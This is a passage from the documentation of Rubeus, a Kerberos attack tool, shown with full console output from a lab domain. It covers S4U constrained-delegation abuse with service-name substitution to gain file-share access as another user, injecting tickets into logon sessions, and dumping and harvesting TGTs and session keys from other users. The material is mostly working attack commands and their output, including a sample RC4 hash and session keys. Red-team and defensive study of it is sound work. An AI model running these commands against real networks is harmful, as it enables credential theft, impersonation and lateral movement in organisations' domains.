    [*] base64(ticket.kirbi) for SPN 'ldap/PRIMARY.testlab.local':

        doIGujCCBragAwIBBaEDAgEWoo..(snip)..

Where `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_. 

The `/altservice` parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (`/altservice:cifs,HOST,...`).

Let's expand on the previous example, forging access to the filesystem on **primary.testlab.local** by abusing its constrained delegation configuration and the alternate service substitution. Let's package it all into one step as well, performing a TGT request, S4U2self process, S4U2proxy execution, and injection of the final ticket:

    C:\Rubeus>dir \\primary.testlab.local\C$
    Access is denied.

    C:\Rubeus>Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a /msdsspn:"ldap/PRIMARY.testlab.local" /altservice:cifs /ptt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1377 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIE+jCCBPagAwIBBaEDAgEWoo..(snip)..


    [*] Action: S4U

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building S4U2self request for: 'TESTLAB.LOCAL\patsy'
    [*] Sending S4U2self request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1437 bytes
    [*] Received 1574 bytes
    [+] S4U2self success!
    [*] Got a TGS for 'dfm.a@TESTLAB.LOCAL' to 'TESTLAB.LOCAL\patsy'
    [*] base64(ticket.kirbi):

        doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..

    [*] Impersonating user 'dfm.a' to target SPN 'ldap/PRIMARY.testlab.local'
    [*]   Final ticket will be for the alternate service 'cifs'
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building S4U2proxy request for service: 'ldap/PRIMARY.testlab.local'
    [*] Sending S4U2proxy request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 2641 bytes
    [*] Received 1829 bytes
    [+] S4U2proxy success!
    [*] Substituting alternative service name 'cifs'
    [*] base64(ticket.kirbi) for SPN 'cifs/PRIMARY.testlab.local':

        doIGujCCBragAwIBBaEDAgEWoo..(snip)..

    [*] Action: Import Ticket
    [+] Ticket successfully imported!

    C:\Rubeus>dir \\primary.testlab.local\C$
    Volume in drive \\primary.testlab.local\C$ has no label.
    Volume Serial Number is A48B-4D68

    Directory of \\primary.testlab.local\C$

    07/05/2018  12:57 PM    <DIR>          dumps
    03/05/2017  04:36 PM    <DIR>          inetpub
    08/22/2013  07:52 AM    <DIR>          PerfLogs
    04/15/2017  05:25 PM    <DIR>          profiles
    08/28/2018  11:51 AM    <DIR>          Program Files
    08/28/2018  11:51 AM    <DIR>          Program Files (x86)
    10/09/2018  12:04 PM    <DIR>          Temp
    08/23/2018  03:52 PM    <DIR>          Users
    10/25/2018  01:15 PM    <DIR>          Windows
                1 File(s)              9 bytes
                9 Dir(s)  40,511,676,416 bytes free


## Ticket Management

Breakdown of the ticket management commands:

| Command     | Description |
| ----------- | ----------- |
| [ptt](#ptt) | Apply a ticket to the current (or specified) logon session |
| [purge](#purge) | Purge the current (or specified) logon session of Kerberos tickets |
| [describe](#describe) | Describe a ticket base64 blob or .kirbi file |


### ptt

The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the current logon session through the LsaCallAuthenticationPackage() API with a KERB_SUBMIT_TKT_REQUEST message, or (**if elevated**) to the logon session specified by `/luid:0xA..`. Like other `/ticket:X` parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.

    C:\Rubeus>Rubeus.exe ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Import Ticket
    [+] Ticket successfully imported!

    C:\Rubeus>Rubeus.exe klist

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (Current User)

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM
        Server Name       : krbtgt/testlab.local @ TESTLAB.LOCAL
        Client Name       : dfm.a @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)


**Elevated** ticket application to another logon session:

    C:\Rubeus>Rubeus.exe klist /luid:0x474722b

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (All Users)

    [*] Target LUID     : 0x474722b

    UserName                 : patsy
    Domain                   : TESTLAB
    LogonId                  : 0x474722b
    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169
    AuthenticationPackage    : Kerberos
    LogonType                : Interactive
    LogonTime                : 2/11/2019 10:58:53 PM
    LogonServer              : PRIMARY
    LogonServerDNSDomain     : TESTLAB.LOCAL
    UserPrincipalName        : patsy@testlab.local

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 2:58:53 PM ; 2/11/2019 7:58:53 PM ; 2/18/2019 2:58:53 PM
        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
        Client Name       : patsy @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)


    C:\Rubeus>Rubeus.exe ptt /luid:0x474722b /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Import Ticket
    [*] Target LUID: 0x474722b
    [+] Ticket successfully imported!

    C:\Rubeus>Rubeus.exe klist /luid:0x474722b

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (All Users)

    [*] Target LUID     : 0x474722b

    UserName                 : patsy
    Domain                   : TESTLAB
    LogonId                  : 0x474722b
    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169
    AuthenticationPackage    : Kerberos
    LogonType                : Interactive
    LogonTime                : 2/11/2019 10:58:53 PM
    LogonServer              : PRIMARY
    LogonServerDNSDomain     : TESTLAB.LOCAL
    UserPrincipalName        : patsy@testlab.local

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM
        Server Name       : krbtgt/testlab.local @ TESTLAB.LOCAL
        Client Name       : dfm.a @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)


### purge

The **purge** action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by `/luid:0xA..`.

    C:\Rubeus>Rubeus.exe klist

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (Current User)

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
        Client Name       : harmj0y @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)

        [1] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
        Client Name       : harmj0y @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)

        [2] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
        Server Name       : cifs/primary.testlab.local @ TESTLAB.LOCAL
        Client Name       : harmj0y @ TESTLAB.LOCAL
        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)


    C:\Rubeus>Rubeus.exe purge

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    Luid: 0x0

    [*] Action: Purge Tickets
    [+] Tickets successfully purged!

    C:\Rubeus>Rubeus.exe klist

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (Current User)


    C:\Rubeus>


**Elevated** purging of another logon session:

    C:\Rubeus>Rubeus.exe triage /luid:0x474722b

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: Triage Kerberos Tickets

    [*] Target LUID     : 0x474722b

    -----------------------------------------------------------------------------------
    | LUID      | UserName              | Service              | EndTime              |
    -----------------------------------------------------------------------------------
    | 0x474722b | dfm.a @ TESTLAB.LOCAL | krbtgt/testlab.local | 2/11/2019 7:55:18 PM |
    -----------------------------------------------------------------------------------


    C:\Rubeus>Rubeus.exe purge /luid:0x474722b

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    Luid: 0x474722b

    [*] Action: Purge Tickets
    [*] Target LUID: 0x474722b
    [+] Tickets successfully purged!

    C:\Rubeus>Rubeus.exe triage /luid:0x474722b

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: Triage Kerberos Tickets

    [*] Target LUID     : 0x474722b

    ---------------------------------------
    | LUID | UserName | Service | EndTime |
    ---------------------------------------
    ---------------------------------------


### describe

The **describe** action takes a `/ticket:X` value (TGT or service ticket), parses it, and describes the values of the ticket. Like other `/ticket:X` parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.

    C:\Rubeus>Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Describe Ticket

    UserName              :  dfm.a
    UserRealm             :  TESTLAB.LOCAL
    ServiceName           :  krbtgt/testlab.local
    ServiceRealm          :  TESTLAB.LOCAL
    StartTime             :  2/11/2019 2:55:18 PM
    EndTime               :  2/11/2019 7:55:18 PM
    RenewTill             :  2/18/2019 2:55:18 PM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  rc4_hmac
    Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==


## Ticket Extraction and Harvesting

Breakdown of the ticket extraction/harvesting commands:

| Command     | Description |
| ----------- | ----------- |
| [triage](#triage) | LUID, username, service target, ticket expiration |
| [klist](#klist) | Detailed logon session and ticket info |
| [dump](#dump) | Detailed logon session and ticket data |
| [tgtdeleg](#tgtdeleg) | Retrieve usable TGT for non-elevated user |
| [monitor](#monitor) | Monitor logon events and dump new tickets |
| [harvest](#harvest) | Same as monitor but with auto-renewal functionality|

**Note:** [triage](#triage)/[klist](#klist)/[dump](#dump) give increasing amounts of ticket detail.


### triage

The **triage** action will output a table of the current user's Kerberos tickets, if not elevated. If run from an elevated context, a table describing all Kerberos tickets on the system is displayed. Ticket can be filtered for a specific service with `/service:SNAME`.

If elevated, tickets can be filtered for a specific LogonID with `/luid:0xA..` or a specific user with `/user:USER`. This can be useful when triaging systems with a lot of Kerberos tickets.

Triage all enumerateable tickets (non-elevated):

    C:\Rubeus>Rubeus.exe triage

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4



    [*] Action: Triage Kerberos Tickets (Current User)

    [*] Current LUID    : 0x4420e

    -----------------------------------------------------------------------------------------
    | LUID    | UserName                | Service                    | EndTime              |
    -----------------------------------------------------------------------------------------
    | 0x4420e | harmj0y @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL       | 2/12/2019 4:04:14 PM |
    | 0x4420e | harmj0y @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL       | 2/12/2019 4:04:14 PM |
    | 0x4420e | harmj0y @ TESTLAB.LOCAL | cifs/primary.testlab.local | 2/12/2019 4:04:14 PM |
    -----------------------------------------------------------------------------------------

Triage all enumerateable tickets (elevated):

    C:\Rubeus>Rubeus.exe triage

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4



    [*] Action: Triage Kerberos Tickets (All Users)

    -------------------------------------------------------------------------------------------------------------
    | LUID      | UserName                   | Service                                  | EndTime               |
    -------------------------------------------------------------------------------------------------------------
    | 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:14 PM  |
    | 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:14 PM  |
    | 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | cifs/primary.testlab.local               | 2/12/2019 4:04:14 PM  |
    | 0x56cdd86 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:02 PM  |
    | 0x47869cc | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:19:11 PM  |
    | 0x47869cc | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:19:11 PM  |
    | 0x47869cc | harmj0y @ TESTLAB.LOCAL    | cifs/primary.testlab.local               | 2/12/2019 3:19:11 PM  |
    | 0x47869b4 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:05:29 PM  |
    | 0x3c4c241 | dfm.a @ TESTLAB.LOCAL      | krbtgt/TESTLAB.LOCAL                     | 2/11/2019 4:24:02 AM  |
    | 0x441d8   | dfm.a @ TESTLAB.LOCAL      | cifs/primary.testlab.local               | 2/10/2019 11:41:26 PM |
    | 0x441d8   | dfm.a @ TESTLAB.LOCAL      | LDAP/primary.testlab.local               | 2/10/2019 11:41:26 PM |
    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 1:25:01 PM  |
    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 1:25:01 PM  |
    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local               | 2/12/2019 1:25:01 PM  |
    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/11/2019 7:23:48 PM  |
    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 2:23:45 PM  |
    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 2:23:45 PM  |
    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |
    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | WINDOWS10$                               | 2/12/2019 2:23:45 PM  |
    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |
    -------------------------------------------------------------------------------------------------------------


Triage targeting a specific service (elevated):

    C:\Rubeus>Rubeus.exe triage /service:ldap

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4



    [*] Action: Triage Kerberos Tickets (All Users)

    [*] Target service  : ldap

    -----------------------------------------------------------------------------------------------------------
    | LUID    | UserName                   | Service                                  | EndTime               |
    -----------------------------------------------------------------------------------------------------------
    | 0x441d8 | dfm.a @ TESTLAB.LOCAL      | LDAP/primary.testlab.local               | 2/10/2019 11:41:26 PM |
    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/11/2019 7:23:48 PM  |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |
    -----------------------------------------------------------------------------------------------------------


### klist

The **klist** will list detailed information on the current user's logon session and Kerberos tickets, if not elevated. If run from an elevated context, information on all logon sessions and associated Kerberos tickets is displayed. Logon and ticket information can be displayed for a specific LogonID with `/luid:0xA..` (if elevated).

Listing the current (non-elevated) user's logon session and Kerberos ticket information:

    C:\Rubeus>Rubeus.exe klist

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4



    [*] Action: List Kerberos Tickets (Current User)

    [*] Current LUID    : 0x4420e

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/12/2019 11:04:14 AM ; 2/12/2019 4:04:14 PM ; 2/19/2019 11:04:14 AM
        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
        Client Name       : harmj0y @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)

        ...(snip)...


**Elevated** listing of another user's logon session/Kerberos ticket information:

    C:\Rubeus>Rubeus.exe klist /luid:0x47869b4

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (All Users)

    [*] Target LUID     : 0x47869b4

    UserName                 : harmj0y
    Domain                   : TESTLAB
    LogonId                  : 0x47869b4
    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
    AuthenticationPackage    : Kerberos
    LogonType                : Interactive
    LogonTime                : 2/11/2019 11:05:31 PM
    LogonServer              : PRIMARY
    LogonServerDNSDomain     : TESTLAB.LOCAL
    UserPrincipalName        : harmj0y@testlab.local

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/11/2019 3:05:31 PM ; 2/11/2019 8:05:31 PM ; 2/18/2019 3:05:31 PM
        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
        Client Name       : harmj0y @ TESTLAB.LOCAL
        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)

        ...(snip)...


### dump

The **dump** action will extract current TGTs and service tickets if in an elevated context. If not elevated, service tickets for the current user are extracted. The resulting extracted tickets can be filtered by `/service` (use `/service:krbtgt` for TGTs) and/or logon ID (the `/luid:0xA..` parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **kerberos::ptt** functionality.

**Note:** if run from a _non-elevated_ context, the session keys for TGTs are not returned (by default) from the associated APIs, so only service tickets extracted will be usable. If you want to (somewhat) workaround this, use the **tgtdeleg** command.

Extracting the current user's usable service tickets:

    C:\Rubeus>Rubeus.exe dump

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.4



    [*] Action: Dump Kerberos Ticket Data (Current User)

    [*] Current LUID    : 0x4420e

    [*] Returned 3 tickets

    ServiceName              : krbtgt/TESTLAB.LOCAL
    TargetName               : krbtgt/TESTLAB.LOCAL
    ClientName               : harmj0y
    DomainName               : TESTLAB.LOCAL
    TargetDomainName         : TESTLAB.LOCAL
    AltTargetDomainName      : TESTLAB.LOCAL
    SessionKeyType           : rc4_hmac
    Base64SessionKey         : AAAAAAAAAAAAAAAAAAAAAA==
    KeyExpirationTime        : 12/31/1600 4:00:00 PM
    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
    StartTime                : 2/11/2019 3:19:15 PM
    EndTime                  : 2/11/2019 8:19:13 PM
    RenewUntil               : 2/18/2019 3:19:13 PM
    TimeSkew                 : 0
    EncodedTicketSize        : 1306
    Base64EncodedTicket      :

        doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...

    ...(snip)...



    [*] Enumerated 3 total tickets
    [*] Extracted  3 total tickets


**Elevated** extraction of tickets from a specific logon session:

    C:\Rubeus>Rubeus.exe dump /luid:0x47869cc

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: Dump Kerberos Ticket Data (All Users)

    [*] Target LUID: 0x47869cc

    UserName                 : harmj0y
    Domain                   : TESTLAB
    LogonId                  : 0x47869cc
    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
    AuthenticationPackage    : Negotiate
    LogonType                : Interactive
    LogonTime                : 2/11/2019 11:05:31 PM
    LogonServer              : PRIMARY
    LogonServerDNSDomain     : TESTLAB.LOCAL
    UserPrincipalName        : harmj0y@testlab.local

        [*] Enumerated 3 ticket(s):

        ServiceName              : krbtgt/TESTLAB.LOCAL
        TargetName               : krbtgt/TESTLAB.LOCAL
        ClientName               : harmj0y
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : rc4_hmac
        Base64SessionKey         : u9DOCzuGKAZB6h/E/9XcFg==
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
        StartTime                : 2/11/2019 3:21:53 PM
        EndTime                  : 2/11/2019 8:19:13 PM
        RenewUntil               : 2/18/2019 3:19:13 PM
        TimeSkew                 : 0
        EncodedTicketSize        : 1306
        Base64EncodedTicket      :

        doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...

        ServiceName              : krbtgt/TESTLAB.LOCAL
        TargetName               : krbtgt/TESTLAB.LOCAL
        ClientName               : harmj0y
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : aes256_cts_hmac_sha1
        Base64SessionKey         : tKcszT8rdYyxBxBHlkpmJ/SEsfON8mBMs4ZN/29Xv8A=
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, pre_authent, initial, renewable, forwardable
        StartTime                : 2/11/2019 3:19:13 PM
        EndTime                  : 2/11/2019 8:19:13 PM
        RenewUntil               : 2/18/2019 3:19:13 PM
        TimeSkew                 : 0
        EncodedTicketSize        : 1338
        Base64EncodedTicket      :

        doIFNjCCBTKgAwIBBaEDAgEWoo...(snip)...

        ...(snip)...


    [*] Enumerated 3 total tickets
    [*] Extracted  3 total tickets


**Elevated** extraction of all TGTs on a system:

    C:\Rubeus>Rubeus.exe dump /service:krbtgt

     ______        _                      
    (_____ \      | |                     
     _____) )_   _| |__  _____ _   _  ___ 
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: Dump Kerberos Ticket Data (All Users)

    [*] Target service  : krbtgt


    UserName                 : harmj0y
    Domain                   : TESTLAB
    LogonId                  : 0x47869cc
    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
    AuthenticationPackage    : Negotiate
    LogonType                : Interactive
    LogonTime                : 2/11/2019 11:05:31 PM
    LogonServer              : PRIMARY
    LogonServerDNSDomain     : TESTLAB.LOCAL
    UserPrincipalName        : harmj0y@testlab.local

        [*] Enumerated 3 ticket(s):

        ServiceName              : krbtgt/TESTLAB.LOCAL
        TargetName               : krbtgt/TESTLAB.LOCAL
        ClientName               : harmj0y
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : rc4_hmac
        Base64SessionKey         : y4LL+W3KZoOjnwsiwf150g==
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
        StartTime                : 2/11/2019 3:23:50 PM
        EndTime                  : 2/11/2019 8:19:13 PM
        RenewUntil               : 2/18/2019 3:19:13 PM
        TimeSkew                 : 0
        EncodedTicketSize        : 1306
        Base64EncodedTicket      :

        doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...

        ...(snip)...

    UserName                 : WINDOWS10$
    Domain                   : TESTLAB
    LogonId                  : 0x3e4
    UserSID                  : S-1-5-20
    AuthenticationPackage    : Negotiate
    LogonType                : Service
    LogonTime                : 2/7/2019 4:51:20 PM
    LogonServer              : 
    LogonServerDNSDomain     : testlab.local
    UserPrincipalName        : WINDOWS10$@testlab.local

        [*] Enumerated 4 ticket(s):

        ServiceName              : krbtgt/TESTLAB.LOCAL
        TargetName               : krbtgt/TESTLAB.LOCAL
        ClientName               : WINDOWS10$
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : rc4_hmac
        Base64SessionKey         : 0NgsSyZ/XOCTi9wLR1z9Kg==
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
        StartTime                : 2/11/2019 3:23:50 PM
        EndTime                  : 2/11/2019 7:23:48 PM
        RenewUntil               : 2/18/2019 2:23:48 PM
        TimeSkew                 : 0
        EncodedTicketSize        : 1304
        Base64EncodedTicket      :

        doIFFDCCBRCgAwIBBaEDAgEWoo...(snip)...

        ...(snip)...


    [*] Enumerated 20 total tickets
    [*] Extracted  9 total tickets


### tgtdeleg

The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.

